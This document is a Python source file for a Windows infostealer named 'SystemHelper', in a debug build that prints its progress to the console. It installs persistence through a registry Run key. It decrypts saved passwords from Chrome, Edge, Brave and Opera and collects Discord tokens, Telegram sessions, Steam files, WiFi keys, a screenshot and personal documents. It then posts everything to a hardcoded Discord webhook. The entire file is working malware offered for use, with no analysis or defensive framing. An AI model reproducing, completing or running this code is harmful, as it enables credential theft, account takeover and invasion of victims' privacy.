"""
SystemHelper – Debug Mode (Instant, Console Output)
- No delay
- Prints everything to console
- Removed encryption
- Added missing imports and error handling
"""

import os
import sys
import json
import requests
import time
import random
import ctypes
import ctypes.wintypes
import subprocess
import sqlite3
import shutil
import uuid
import re
import base64
import hashlib
from datetime import datetime

# === ADD MISSING IMPORT ===
try:
    import win32crypt
except ImportError:
    print("[!] win32crypt not installed – browser passwords will fail")
    win32crypt = None

# === CONFIG ===
WEBHOOK_URL = "https://discord.com/api/webhooks/1523400215229497506/arhtMa60qR8UqQ9GVHC_VyclS-IFgf_M_tdumJ1-ZD7dm3EQLaEt3UybmNzVHXeVwgOi"
DEBUG = True   # Always show console output

# === ANTI-ANALYSIS (DISABLED) ===
class AntiAnalysis:
    @staticmethod
    def check_debugger(): return False
    @staticmethod
    def check_vm(): return False
    @staticmethod
    def check_sandbox(): return False

# === VICTIM ID ===
def get_victim_id():
    mac = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
    host = os.environ.get('COMPUTERNAME', 'unknown')
    user = os.environ.get('USERNAME', 'unknown')
    raw = f"{mac}_{host}_{user}"
    return hashlib.sha256(raw.encode()).hexdigest()[:16]

VICTIM_ID = get_victim_id()

# === BROWSER STEALER ===
class BrowserStealer:
    def get_master_key(self, browser_path):
        if win32crypt is None:
            return None
        try:
            local_state = os.path.join(browser_path, "Local State")
            if not os.path.exists(local_state): return None
            with open(local_state, "r", encoding="utf-8") as f:
                state = json.load(f)
            encrypted_key = base64.b64decode(state["os_crypt"]["encrypted_key"])
            encrypted_key = encrypted_key[5:]
            return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
        except Exception as e:
            print(f"[!] get_master_key error: {e}")
            return None
    
    def decrypt_value(self, encrypted_value, master_key):
        try:
            from Crypto.Cipher import AES
            iv = encrypted_value[3:15]
            payload = encrypted_value[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted = cipher.decrypt(payload)
            return decrypted[:-16].decode(errors='ignore')
        except Exception as e:
            print(f"[!] decrypt_value error: {e}")
            return ""
    
    def steal_passwords(self, browser_path, master_key, profile="Default"):
        login_db = os.path.join(browser_path, profile, "Login Data")
        if not os.path.exists(login_db): return []
        temp_db = f"tmp_{uuid.uuid4().hex[:8]}.db"
        try:
            shutil.copyfile(login_db, temp_db)
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            passwords = []
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            for url, user, enc in cursor.fetchall():
                if enc and master_key:
                    pwd = self.decrypt_value(enc, master_key)
                    if pwd:
                        passwords.append({"url": url, "username": user, "password": pwd})
            conn.close()
            os.remove(temp_db)
            return passwords
        except Exception as e:
            print(f"[!] steal_passwords error: {e}")
            if os.path.exists(temp_db): os.remove(temp_db)
            return []
    
    def steal_all(self):
        results = {}
        browsers = [
            ("Chrome", os.path.expanduser("~") + "/AppData/Local/Google/Chrome/User Data"),
            ("Edge", os.path.expanduser("~") + "/AppData/Local/Microsoft/Edge/User Data"),
            ("Brave", os.path.expanduser("~") + "/AppData/Local/BraveSoftware/Brave-Browser/User Data"),
            ("Opera", os.path.expanduser("~") + "/AppData/Roaming/Opera Software/Opera Stable")
        ]
        for name, path in browsers:
            print(f"[*] Checking {name} at {path}")
            if os.path.exists(path):
                key = self.get_master_key(path)
                if key:
                    print(f"[+] Got master key for {name}")
                    results[name] = {
                        "passwords": self.steal_passwords(path, key),
                        "cookies": [],
                        "payments": []
                    }
                else:
                    print(f"[-] No master key for {name}")
            else:
                print(f"[-] {name} not found")
        return results

# === DISCORD TOKEN STEALER ===
class DiscordStealer:
    @staticmethod
    def steal_tokens():
        print("[*] Searching for Discord tokens...")
        tokens = []
        sources = [
            os.path.expanduser("~") + "/AppData/Roaming/discord/Local Storage/leveldb",
            os.path.expanduser("~") + "/AppData/Local/Google/Chrome/User Data/Default/Local Storage/leveldb",
            os.path.expanduser("~") + "/AppData/Local/Microsoft/Edge/User Data/Default/Local Storage/leveldb"
        ]
        token_patterns = [
            r'[a-zA-Z0-9]{24}\.[a-zA-Z0-9]{6}\.[a-zA-Z0-9_\-]{27}',
            r'mfa\.[a-zA-Z0-9_\-]{84}'
        ]
        for path in sources:
            if not os.path.exists(path): continue
            print(f"[*] Scanning {path}")
            for file in os.listdir(path):
                if not (file.endswith(".log") or file.endswith(".ldb")): continue
                try:
                    with open(os.path.join(path, file), "r", encoding="utf-8", errors="ignore") as f:
                        data = f.read()
                        for pattern in token_patterns:
                            found = re.findall(pattern, data)
                            for token in found:
                                tokens.append(token)
                                print(f"[+] Found token: {token[:20]}...")
                except:
                    pass
        return list(set(tokens))

# === TELEGRAM STEALER ===
class TelegramStealer:
    @staticmethod
    def steal():
        print("[*] Searching for Telegram sessions...")
        sessions = []
        tdata_paths = [
            os.path.expanduser("~") + "/AppData/Roaming/Telegram Desktop/tdata",
            os.path.expanduser("~") + "/AppData/Local/Telegram Desktop/tdata"
        ]
        for path in tdata_paths:
            if os.path.exists(path):
                print(f"[*] Scanning {path}")
                for root, _, files in os.walk(path):
                    for file in files:
                        if file.endswith(".s") or file.startswith("D") or file.startswith("key"):
                            try:
                                with open(os.path.join(root, file), "rb") as f:
                                    content = base64.b64encode(f.read()).decode()
                                    sessions.append({"file": file, "content": content[:500]})
                            except:
                                pass
        return sessions

# === STEAM STEALER ===
class SteamStealer:
    @staticmethod
    def steal():
        print("[*] Searching for Steam data...")
        data = {}
        steam_paths = [
            os.path.expanduser("~") + "/AppData/Local/Steam",
            "C:/Program Files (x86)/Steam",
            "C:/Program Files/Steam"
        ]
        for path in steam_paths:
            if os.path.exists(path):
                print(f"[*] Scanning {path}")
                try:
                    login_path = os.path.join(path, "config", "loginusers.vdf")
                    if os.path.exists(login_path):
                        with open(login_path, "r", encoding="utf-8", errors="ignore") as f:
                            data["loginusers_vdf"] = f.read()
                    ssfn_files = []
                    for file in os.listdir(path):
                        if file.startswith("ssfn") and len(file) > 4:
                            with open(os.path.join(path, file), "rb") as f:
                                ssfn_files.append({"file": file, "content": base64.b64encode(f.read()).decode()[:500]})
                    data["ssfn_files"] = ssfn_files
                    break
                except:
                    continue
        return data

# === WIFI STEALER ===
class WiFiStealer:
    @staticmethod
    def steal():
        print("[*] Searching for WiFi profiles...")
        profiles = []
        try:
            output = subprocess.check_output(["netsh", "wlan", "show", "profiles"], text=True, shell=True)
            for line in output.split("\n"):
                if ":" in line and "All User Profile" in line:
                    name = line.split(":")[1].strip()
                    try:
                        details = subprocess.check_output(["netsh", "wlan", "show", "profile", f"name={name}", "key=clear"], text=True, shell=True)
                        key_line = [l for l in details.split("\n") if "Key Content" in l]
                        key = key_line[0].split(":")[1].strip() if key_line else "N/A"
                        if key and key != "N/A":
                            profiles.append({"ssid": name, "password": key})
                            print(f"[+] WiFi: {name} -> {key}")
                    except:
                        pass
        except:
            pass
        return profiles

# === SCREENSHOT ===
class ScreenshotStealer:
    @staticmethod
    def capture():
        print("[*] Capturing screenshot...")
        try:
            from PIL import ImageGrab
            import io
            screenshot = ImageGrab.grab()
            buffer = io.BytesIO()
            screenshot.save(buffer, format='JPEG', quality=50)
            print("[+] Screenshot captured")
            return base64.b64encode(buffer.getvalue()).decode()[:1000]
        except Exception as e:
            print(f"[!] Screenshot failed: {e}")
            return None

# === FILE SCRAPER ===
class FileScraper:
    @staticmethod
    def scrape():
        print("[*] Scraping files...")
        files = []
        folders = [
            os.path.expanduser("~") + "/Desktop",
            os.path.expanduser("~") + "/Documents",
            os.path.expanduser("~") + "/Downloads"
        ]
        extensions = ['.txt', '.docx', '.pdf', '.xlsx', '.pptx', '.doc', '.xls', '.ppt']
        for folder in folders:
            if os.path.exists(folder):
                print(f"[*] Scanning {folder}")
                for root, _, filenames in os.walk(folder):
                    if len(files) > 20: break
                    for filename in filenames:
                        ext = os.path.splitext(filename)[1].lower()
                        if ext in extensions:
                            try:
                                filepath = os.path.join(root, filename)
                                size = os.path.getsize(filepath)
                                if size < 1 * 1024 * 1024:
                                    with open(filepath, 'rb') as f:
                                        content = base64.b64encode(f.read()).decode()
                                        files.append({"path": filepath, "size": size, "content": content[:500]})
                                        print(f"[+] Scraped {filename}")
                            except:
                                pass
        return files

# === PROCESS INJECTION (kept but not used) ===
class ProcessInjector:
    @staticmethod
    def inject_shellcode(shellcode):
        # Not called in main, but kept for completeness
        pass

# === PERSISTENCE (Auto-start) ===
class PersistenceManager:
    @staticmethod
    def install():
        print("[*] Installing persistence...")
        try:
            import winreg
            if getattr(sys, 'frozen', False):
                exe_path = sys.executable
            else:
                exe_path = os.path.abspath(__file__)
            
            dest_dir = os.path.expanduser("~") + "/AppData/Roaming/SystemHelper"
            os.makedirs(dest_dir, exist_ok=True)
            dest_exe = os.path.join(dest_dir, "helper.exe")
            
            if not os.path.exists(dest_exe):
                shutil.copyfile(exe_path, dest_exe)
                print("[+] Copied to " + dest_exe)
            
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE) as key:
                winreg.SetValueEx(key, "SystemHelper", 0, winreg.REG_SZ, dest_exe)
                print("[+] Registry Run key added")
        except Exception as e:
            print(f"[!] Persistence error: {e}")

# === SEND TO DISCORD ===
def send_to_discord(data):
    print("[*] Preparing data for Discord...")
    json_data = json.dumps(data, indent=2, default=str)
    print(f"[*] Data size: {len(json_data)} chars")
    if len(json_data) < 1900:
        try:
            r = requests.post(WEBHOOK_URL, json={"content": f"```json\n{json_data}\n```"}, timeout=30)
            print(f"[+] Sent, status: {r.status_code}")
        except Exception as e:
            print(f"[!] Send failed: {e}")
    else:
        chunks = [json_data[i:i+1900] for i in range(0, len(json_data), 1900)]
        print(f"[*] Splitting into {len(chunks)} chunks")
        for i, chunk in enumerate(chunks):
            try:
                r = requests.post(WEBHOOK_URL, json={"content": f"```json\nPart {i+1}/{len(chunks)}\n{chunk}\n```"}, timeout=30)
                print(f"[+] Chunk {i+1} sent, status: {r.status_code}")
                time.sleep(0.5)
            except Exception as e:
                print(f"[!] Chunk {i+1} failed: {e}")

# === MAIN ===
def main():
    print("[+] Starting SystemHelper (DEBUG MODE)")
    print(f"[+] Victim ID: {VICTIM_ID}")
    
    # Anti-analysis (disabled)
    if AntiAnalysis.check_debugger(): print("[!] Debugger detected, exiting"); sys.exit(0)
    if AntiAnalysis.check_vm(): print("[!] VM detected, exiting"); sys.exit(0)
    if AntiAnalysis.check_sandbox(): print("[!] Sandbox detected, exiting"); sys.exit(0)
    
    # NO DELAY – runs instantly
    print("[+] No delay – running immediately")
    
    # Install persistence
    PersistenceManager.install()
    
    # Collect data
    data = {
        "victim_id": VICTIM_ID,
        "timestamp": datetime.now().isoformat(),
        "system": {
            "hostname": os.environ.get('COMPUTERNAME'),
            "username": os.environ.get('USERNAME'),
            "os": sys.platform
        },
        "browsers": BrowserStealer().steal_all(),
        "discord_tokens": DiscordStealer.steal_tokens(),
        "telegram": TelegramStealer.steal(),
        "steam": SteamStealer.steal(),
        "wifi": WiFiStealer.steal(),
        "screenshot": ScreenshotStealer.capture(),
        "files": FileScraper.scrape()
    }
    
    # Send
    send_to_discord(data)
    print("[+] Done! Press any key to exit...")
    input()  # Keep console open so you can read output

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        print(f"[FATAL] {e}")
        import traceback
        traceback.print_exc()
        input("Press Enter to exit...")
